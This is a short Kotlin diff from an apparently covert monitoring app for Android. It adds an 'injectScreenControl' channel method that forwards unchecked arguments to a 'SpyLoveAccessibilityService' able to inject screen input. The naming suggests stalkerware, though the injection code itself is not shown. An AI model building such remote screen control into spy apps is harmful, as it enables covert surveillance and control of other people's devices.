@@ -191,6 +191,11 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
                 val page = call.argument<String>("page") ?: ""
                 result.success(getSettingsPermissionState(page))
             }
+            "injectScreenControl" -> {
+                @Suppress("UNCHECKED_CAST")
+                val raw = call.arguments as? Map<String, Any?>
+                result.success(SpyLoveAccessibilityService.inject(raw))
+            }
             "getInstalledApps" -> {
                 val includeSystem = call.argument<Boolean>("includeSystem") ?: true
                 result.success(readInstalledApps(includeSystem))
